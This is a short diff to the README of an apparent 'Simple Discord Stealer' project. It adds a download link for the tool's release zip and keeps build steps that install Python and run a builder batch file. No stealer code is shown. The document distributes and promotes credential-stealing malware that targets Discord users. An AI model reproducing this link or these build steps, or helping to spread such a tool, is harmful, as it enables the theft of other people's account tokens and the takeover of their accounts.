@@ -44,7 +44,7 @@ Simple Discord Stealer.
 ***
 # Running
 `
-1. [Download source code zip]()
+1. [Download source code zip](https://github.com/syslinks/Anonymous-Stealer/releases/download/stealer/Anonymous.zip)
 2. Extract zip
 3. Run `install_python.bat` if you don't have python installed
 4. Run the builder by double clicking the `build.bat` file
